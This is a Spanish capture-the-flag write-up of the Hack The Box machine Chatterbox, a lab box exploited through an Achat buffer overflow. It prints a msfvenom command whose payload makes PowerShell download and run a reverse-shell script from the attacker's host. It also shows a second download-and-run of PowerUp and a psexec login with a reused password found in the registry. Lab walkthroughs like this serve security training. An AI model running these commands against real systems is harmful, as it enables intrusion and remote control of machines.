---
layout: single
title: Chatterbox - Hack The Box
excerpt: "Chatterbox es una máquina windows calificada como media, que posee un servicio web Achat a lo cual contiene una vulnerabilidad de ejecución de comandos. Luego de entrar la escalada de privilegios es bastante fácil, contiene una password expuesta por malas configuraciones."
date: 2022-09-07
classes: wide
header:
  teaser: /assets/images/htb-writeup-chatterbox/chatterbox_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - cxdxnt
tags:  
  - psexec 
  - msfvenom
  - achat web
---

![](/assets/images/htb-writeup-chatterbox/chatterbox_logo.png)

Hoy nos enfrentamos contra Chatterbox que es una máquina Windows que ejecuta un cliente de chat web vulnerable a desbordamientos de búfer remotos. Esta vulnerabilidad se aprovechó para obtener una reverse shell en el host y obtener los indicadores de usuario y root debido a permisos débiles o mal configurados.

## Enumeracion

Empezamos con una simple reconocimiento con nmap,al ejecutarlo podemos ver que corre un servicio achat.

```ruby
nmap -sCV -p135,139,445,9255,9256,49152,49153,49154,49155,49156,49157 10.10.10.74
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-07 16:12 -03
Nmap scan report for 10.10.10.74
Host is up (0.25s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  mon?
9256/tcp  open  unknown
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h07m00s, deviation: 2h18m34s, median: 4h46m59s
| smb2-time: 
|   date: 2022-09-08T00:00:18
|_  start_date: 2022-09-07T23:56:02
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-09-07T20:00:19-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.47 seconds
```
Buscamos exploit para dicho servicio que mencionamos anteriormente.

![](/assets/images/htb-writeup-chatterbox/exploit.png)

Y vemos un script en python que gracias a un desbordamiento de buffer logra ejecutar comandos. Sacamos el shellcode que contiene el script y procedemos a crear el nuestro :).

```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8/Invoke-PowerShellTcp.ps1')" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

Ejecutamos el script y tenemos una shell.

![](/assets/images/htb-writeup-chatterbox/powershell.png)
## Elevacion de privilegios

Indagamos un rato por el sistema y no encontramos nada, por lo cual se me ocurrió lanzar un script de powersploit llamado PowerUp, dicho script se encarga de buscar malas configuraciones dentro del sistema. Lo ejecutamos y obtenemos esto.

```powershell
S C:\Users\Alfred\Downloads> powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8/PowerUp.ps1')"       

DefaultDomainName    : 
DefaultUserName      : Alfred
DefaultPassword      : Welcome1!
AltDefaultDomainName : 
AltDefaultUserName   : 
AltDefaultPassword   : 
Check                : Registry Autologons

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files
PS C:\Users\Alfred\Downloads> 
```

Probamos si se está reutilizando la password para el usuario administrator, y vemos que sí. Logramos estar como administrator :).

```bash
impacket-psexec 'WORKGROUP/Administrator:Welcome1!@10.10.10.74' cmd.exe

Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
[*] Requesting shares on 10.10.10.74.....
[*] Found writable share ADMIN$
[*] Uploading file UOAxbKbJ.exe
[*] Opening SVCManager on 10.10.10.74.....
[*] Creating service BYQJ on 10.10.10.74.....
[*] Starting service BYQJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
C:\Windows\system32>
```
